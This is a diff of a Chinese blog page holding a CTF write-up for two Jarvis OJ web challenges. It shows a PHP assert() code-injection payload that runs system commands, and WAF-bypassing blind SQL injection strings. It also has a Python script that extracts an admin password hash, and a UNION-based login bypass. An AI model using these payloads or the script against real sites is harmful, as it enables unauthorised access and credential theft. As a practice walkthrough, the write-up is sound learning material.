@@ -55,18 +55,18 @@
   };
 </script>
 
-  <meta name="description" content="babyphp描述里面发现使用了Git，直接御剑爆破出.git目录。利用工具扒下源码，审计一波。 源码：&amp;lt;?php if (isset($_GET[&amp;apos;page&amp;apos;])) {     $page = $_GET[&amp;apos;page&amp;apos;]; } else {     $page = &amp;quot;home&amp;quot;; } $file = &amp;quot;templates">
+  <meta name="description" content="babyphp描述里面发现使用了Git，直接御剑爆破出.git目录。利用工具扒下源码，审计一波。 源码：123456789101112&amp;lt;?phpif (isset($_GET[&apos;page&apos;])) &amp;#123;    $page = $_GET[&apos;page&apos;];&amp;#125; else &amp;#123;    $page = &quot;home&quot;;&amp;#125;$file = &quot;templates/&quot; . $">
 <meta name="keywords" content="WriteUp">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Jarvis OJ Web WriteUp(2)">
 <meta property="og:url" content="https://github.com/xx-C1/xx-C1.github.io/2018/09/27/Jarvis OJ Web WriteUp(2)/index.html">
 <meta property="og:site_name" content="xxC1&#39;s blog">
-<meta property="og:description" content="babyphp描述里面发现使用了Git，直接御剑爆破出.git目录。利用工具扒下源码，审计一波。 源码：&amp;lt;?php if (isset($_GET[&amp;apos;page&amp;apos;])) {     $page = $_GET[&amp;apos;page&amp;apos;]; } else {     $page = &amp;quot;home&amp;quot;; } $file = &amp;quot;templates">
+<meta property="og:description" content="babyphp描述里面发现使用了Git，直接御剑爆破出.git目录。利用工具扒下源码，审计一波。 源码：123456789101112&amp;lt;?phpif (isset($_GET[&apos;page&apos;])) &amp;#123;    $page = $_GET[&apos;page&apos;];&amp;#125; else &amp;#123;    $page = &quot;home&quot;;&amp;#125;$file = &quot;templates/&quot; . $">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:updated_time" content="2019-10-09T10:54:46.869Z">
+<meta property="og:updated_time" content="2019-10-09T11:15:01.852Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Jarvis OJ Web WriteUp(2)">
-<meta name="twitter:description" content="babyphp描述里面发现使用了Git，直接御剑爆破出.git目录。利用工具扒下源码，审计一波。 源码：&amp;lt;?php if (isset($_GET[&amp;apos;page&amp;apos;])) {     $page = $_GET[&amp;apos;page&amp;apos;]; } else {     $page = &amp;quot;home&amp;quot;; } $file = &amp;quot;templates">
+<meta name="twitter:description" content="babyphp描述里面发现使用了Git，直接御剑爆破出.git目录。利用工具扒下源码，审计一波。 源码：123456789101112&amp;lt;?phpif (isset($_GET[&apos;page&apos;])) &amp;#123;    $page = $_GET[&apos;page&apos;];&amp;#125; else &amp;#123;    $page = &quot;home&quot;;&amp;#125;$file = &quot;templates/&quot; . $">
   <link rel="canonical" href="https://github.com/xx-C1/xx-C1.github.io/2018/09/27/Jarvis OJ Web WriteUp(2)/">
 
 
@@ -294,7 +294,7 @@
                   <i class="fa fa-calendar-check-o"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2019-10-09 18:54:46" itemprop="dateModified" datetime="2019-10-09T18:54:46+08:00">2019-10-09</time>
+                <time title="修改时间：2019-10-09 19:15:01" itemprop="dateModified" datetime="2019-10-09T19:15:01+08:00">2019-10-09</time>
               </span>
             
           
@@ -336,7 +336,7 @@
               
                 <span class="post-meta-item-text">本文字数：</span>
               
-              <span>3.5k</span>
+              <span>3.4k</span>
             </span>
           
             <span class="post-meta-item" title="阅读时长">
@@ -359,75 +359,58 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <h5 id="babyphp"><a href="#babyphp" class="headerlink" title="babyphp"></a>babyphp</h5><p>描述里面发现使用了Git，直接御剑爆破出.git目录。利用工具扒下源码，审计一波。 源码：</p><pre><code>&lt;?php
-if (isset($_GET[&apos;page&apos;])) {
-    $page = $_GET[&apos;page&apos;];
-} else {
-    $page = &quot;home&quot;;
-}
-$file = &quot;templates/&quot; . $page . &quot;.php&quot;;
-// I heard &apos;..&apos; is dangerous!
-assert(&quot;strpos(&apos;$file&apos;, &apos;..&apos;) === false&quot;) or die(&quot;Detected hacking attempt!&quot;);
-// TODO: Make this look nice
-assert(&quot;file_exists(&apos;$file&apos;)&quot;) or die(&quot;That file doesn&apos;t exist!&quot;);
-?&gt;</code></pre><a id="more"></a>
-<p>assert函数果断是常见的危险函数。如果第一个参数是字符串会当作为代码执行。构造payload： <code>http://web.jarvisoj.com:32798/?page=flag&#39;.system(&quot;ls templates/;&quot;).&#39;</code> <code>http://web.jarvisoj.com:32798/?page=flag&#39;.system(&quot;cat templates/flag.php;&quot;).&#39;</code> 也可以利用注释掉后面的语句构造payload。</p>
-<h5 id="simple-injection"><a href="#simple-injection" class="headerlink" title="simple injection"></a>simple injection</h5><p>上来一脸懵逼，post注入直接上sqlmap，发现有waf。然后sqlmap绕过waf还不会。。。只能手动了。。。 常规测试: 1.先常规测试一下： <code>username=admin&#39;#</code> 密码随便填，发现报错密码错误。验证了没有过滤’#，而且存在报错注入。 2.然后尝试: <code>admin&#39; order by 1#</code> 发现说用户不存在，那么就说明有waf过滤了空格或order或by中至少一个。 3.先猜测空格吧： 把空格换成/<strong>/，提示密码错误。ok绕过过滤空格。 4.测试一下万能密码： `admin’/</strong>/or/**/1=1#`提示密码错误，没有过滤or。但是存在密码验证，万能密码不能用。 常见的登陆漏洞类型： ①同时验证用户名和密码：</p>
-<pre><code>$sql = select * from users where    username=$usernmae and password=$password
-$result = mysql_query($sql);
-if($result) {
-    echo &quot;登陆成功&quot;;
-} else {
-echo &quot;登陆失败&quot;;
-}  </code></pre><p>②分布验证用户名和密码：</p>
-<pre><code>$sql = &quot;select password from users where username=&apos;$username&apos;&quot;
-$result = mysql_query($sql);
-if($result) {
-$row = mysql_fetch_row($result);
-$query_password = $row[$password];
-#对输入的$password进行变形
-$input_password = modify($passowrd);
-if($input_password == $query_password) {
-    echo &quot;登陆成功&quot;;
-} else {
-    echo &quot;密码错误&quot;;
-}
+        <h2 id="babyphp"><a href="#babyphp" class="headerlink" title="babyphp"></a>babyphp</h2><p>描述里面发现使用了Git，直接御剑爆破出.git目录。利用工具扒下源码，审计一波。 源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'page'</span>])) &#123;</span><br><span class="line">    $page = $_GET[<span class="string">'page'</span>];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $page = <span class="string">"home"</span>;</span><br><span class="line">&#125;</span><br><span class="line">$file = <span class="string">"templates/"</span> . $page . <span class="string">".php"</span>;</span><br><span class="line"><span class="comment">// I heard '..' is dangerous!</span></span><br><span class="line">assert(<span class="string">"strpos('$file', '..') === false"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Detected hacking attempt!"</span>);</span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> Make this look nice</span></span><br><span class="line">assert(<span class="string">"file_exists('$file')"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"That file doesn't exist!"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><a id="more"></a>
 
-} else {
-echo &quot;用户不存在&quot;;
-}</code></pre><p>分别尝试使用：</p>
+
+<p>assert函数果断是常见的危险函数。如果第一个参数是字符串会当作为代码执行。构造payload： `</p>
+<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/web.jarvisoj.com:32798/</span>?page=flag<span class="string">'.system("ls templates/;").'</span> <span class="symbol">http:</span>/<span class="regexp">/web.jarvisoj.com:32798/</span>?page=flag<span class="string">'.system("cat templates/flag.php;").'</span></span><br></pre></td></tr></table></figure>
+
+<p>也可以利用注释掉后面的语句构造payload。</p>
+<h2 id="simple-injection"><a href="#simple-injection" class="headerlink" title="simple injection"></a>simple injection</h2><p>上来一脸懵逼，post注入直接上sqlmap，发现有waf。然后sqlmap绕过waf还不会。。。只能手动了。。。 </p>
+<p>常规测试: </p>
+<ul>
+<li><p>1.先常规测试一下： <code>username=admin&#39;#</code> 密码随便填，发现报错密码错误。验证了没有过滤’#，而且存在报错注入。</p>
+</li>
+<li><p>2.然后尝试: <code>admin&#39; order by 1#</code> 发现说用户不存在，那么就说明有waf过滤了空格或order或by中至少一个。 </p>
+</li>
+<li><p>3.先猜测空格吧： 把空格换成/<strong>/，提示密码错误。ok绕过过滤空格。</strong></p>
+</li>
+<li><p>4.测试一下万能密码： <code>admin&#39;/**/or/**/1=1#</code>提示密码错误，没有过滤or。但是存在密码验证，万能密码不能用。 常见的登陆漏洞类型： </p>
+<ul>
+<li><p>①同时验证用户名和密码：</p>
+</li>
+<li><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$sql = select * from users where    username=$usernmae <span class="keyword">and</span> password=$password</span><br><span class="line">$result = mysql_query($sql);</span><br><span class="line"><span class="keyword">if</span>($result) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"登陆成功"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"登陆失败"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>②分布验证用户名和密码：</p>
+</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">$sql = <span class="string">"select password from users where username='$username'"</span></span><br><span class="line">$result = mysql_query($sql);</span><br><span class="line"><span class="keyword">if</span>($result) &#123;</span><br><span class="line">$row = mysql_fetch_row($result);</span><br><span class="line">$query_password = $row[$password];</span><br><span class="line"></span><br><span class="line"><span class="comment"># 对输入的$password进行变形</span></span><br><span class="line"></span><br><span class="line">$input_password = modify($passowrd);</span><br><span class="line"><span class="keyword">if</span>($input_password == $query_password) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"登陆成功"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"密码错误"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"用户不存在"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>分别尝试使用：</p>
 <pre><code>username=admin&amp;password=123456#密码错误
-username=user&amp;password=123456#用户名错误</code></pre><p>即此题为分步验证。 5.开始盲注 5.1查找表： <code>username=user&#39;/**/or/**/exists(select/**/*/**/from/**/admin)#&amp;password=123456</code>返回密码错误，那么说明在数据库中存在admin表。 5.2查找字段： <code>username=user&#39;/**/or/**/exists(select/**/username,password/**/from/**/admin)#&amp;password=123456</code> 返回密码错误，说明admin中存在username和password字段 <code>username=user&#39;/**/or/**/exists(select/**/count(*)/**/from/**/admin)#&amp;password=123456</code> 返回密码错误，说明在admin表中仅仅只存在一条记录。 得到pasaword长度： <code>username=user&#39;/**/or/**/(select/**/length(password)/**/from/**/admin)&gt;10#&amp;password=123456</code>，通过二分法最终发现password长度为32.即采用md5来加密的。 py脚本跑一下：</p>
-<pre><code># -*- coding: utf-8 -*-
+username=user&amp;password=123456#用户名错误</code></pre><p>即此题为分步验证。 </p>
+<ul>
+<li>5.开始盲注 <ul>
+<li>5.1查找表： <code>username=user&#39;/**/or/**/exists(select/**/*/**/from/**/admin)#&amp;password=123456</code>返回密码错误，那么说明在数据库中存在admin表。</li>
+<li>5.2查找字段： <code>username=user&#39;/**/or/**/exists(select/**/username,password/**/from/**/admin)#&amp;password=123456</code> 返回密码错误，说明admin中存在username和password字段 <code>username=user&#39;/**/or/**/exists(select/**/count(*)/**/from/**/admin)#&amp;password=123456</code> 返回密码错误，说明在admin表中仅仅只存在一条记录。 得到pasaword长度： <code>username=user&#39;/**/or/**/(select/**/length(password)/**/from/**/admin)&gt;10#&amp;password=123456</code>，通过二分法最终发现password长度为32.即采用md5来加密的。 py脚本跑一下：</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span> </span><br><span class="line">    result=<span class="string">""</span></span><br><span class="line">    url=<span class="string">"http://web.jarvisoj.com:32787/login.php"</span></span><br><span class="line">data=&#123;</span><br><span class="line">    <span class="string">'username'</span>:<span class="string">'xx'</span>,</span><br><span class="line">    <span class="string">'password'</span>:<span class="string">'123456'</span></span><br><span class="line">&#125;</span><br><span class="line">payload=<span class="string">"'/**/or/**/ascii(substr((select/**/password/**/from/**/admin),&#123;0&#125;,1))&gt;&#123;1&#125;#"</span></span><br><span class="line">chars=<span class="string">"0123456789@ABCDEFGHIJKLMNOPQRSTUVWXYZ_abcdefghijklmnopqrstuvwxyz"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">33</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> chars:</span><br><span class="line">        char_ascii=ord(j)</span><br><span class="line">        sql_payload=payload.format(i,char_ascii)</span><br><span class="line">        data[<span class="string">'username'</span>]=sql_payload</span><br><span class="line">        <span class="comment">#因为注入点在username上</span></span><br><span class="line">        rep=requests.post(url=url,data=data)</span><br><span class="line">        length=len(rep.text)</span><br><span class="line">        <span class="keyword">if</span> length&gt;<span class="number">1191</span>:</span><br><span class="line">            result+=j</span><br><span class="line">            <span class="keyword">print</span> result</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="keyword">print</span> result</span><br><span class="line"><span class="keyword">print</span> <span class="string">"Done"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">main()</span><br></pre></td></tr></table></figure>
 
-import requests
-
-def main(): 
-    result=&quot;&quot;
-    url=&quot;http://web.jarvisoj.com:32787/login.php&quot;
-data={
-    &apos;username&apos;:&apos;xx&apos;,
-    &apos;password&apos;:&apos;123456&apos;
-}
-payload=&quot;&apos;/**/or/**/ascii(substr((select/**/password/**/from/**/admin),{0},1))&gt;{1}#&quot;
-chars=&quot;0123456789@ABCDEFGHIJKLMNOPQRSTUVWXYZ_abcdefghijklmnopqrstuvwxyz&quot;
-for i in range(1,33):
-    for j in chars:
-        char_ascii=ord(j)
-        sql_payload=payload.format(i,char_ascii)
-        data[&apos;username&apos;]=sql_payload
-        #因为注入点在username上
-        rep=requests.post(url=url,data=data)
-        length=len(rep.text)
-        if length&gt;1191:
-            result+=j
-            print result
-            break
-print result
-print &quot;Done&quot;
-
-if __name__==&quot;__main__&quot;:
-main()</code></pre><p>得出MD5破解后登陆得flag。 在网上还流产一种解法比较骚： 常规测试后猜测： 通过用户名查询密码，然后如果查不出行就提示用户名错误，如果查出了且密码匹配不对，就提示密码错误。 然后直接用联合查询把后面带入user查询password得语句注释掉而是使用查询1： <code>username=admin123&#39;UNION(SELECT(1))#&amp;password=123</code> 返回密码错误，说明语句执行成功。然后尝试把密码改为1提交不正确，猜测后端使用了MD5加密进行比较。因此构造语句： <code>username=admin123&#39;UNION(SELECT(md5(123)))#&amp;password=123</code> 得flag。太骚啦~！！ 通过控制查询到得MD5值，再输入一个匹配得密码使其登陆成功。</p>
+<p>得出MD5破解后登陆得flag。 </p>
+<p>在网上还流产一种解法比较骚： </p>
+<ul>
+<li><p>常规测试后猜测： 通过用户名查询密码，然后如果查不出行就提示用户名错误，如果查出了且密码匹配不对，就提示密码错误。 </p>
+</li>
+<li><p>然后直接用联合查询把后面带入user查询password得语句注释掉而是使用查询1： <code>username=admin123&#39;UNION(SELECT(1))#&amp;password=123</code> 返回密码错误，说明语句执行成功。</p>
+</li>
+<li><p>然后尝试把密码改为1提交不正确，猜测后端使用了MD5加密进行比较。因此构造语句： <code>username=admin123&#39;UNION(SELECT(md5(123)))#&amp;password=123</code> 得flag。</p>
+<p>太骚啦~！！ 通过控制查询到得MD5值，再输入一个匹配得密码使其登陆成功。</p>
+</li>
+</ul>
 
     </div>
     <div>
@@ -556,7 +539,7 @@ main()</code></pre><p>得出MD5破解后登陆得flag。 在网上还流产一�
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-5"><a class="nav-link" href="#babyphp"><span class="nav-text">babyphp</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#simple-injection"><span class="nav-text">simple injection</span></a></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#babyphp"><span class="nav-text">babyphp</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#simple-injection"><span class="nav-text">simple injection</span></a></li></ol></div>
         
       </div>
       <!--/noindex-->
@@ -713,12 +696,12 @@ main()</code></pre><p>得出MD5破解后登陆得flag。 在网上还流产一�
     <span class="post-meta-item-icon">
       <i class="fa fa-area-chart"></i>
     </span>
-    <span title="站点总字数">84k</span>
+    <span title="站点总字数">86k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">2:20</span>
+    <span title="站点阅读时长">2:23</span>
 </div>
 
 <!--
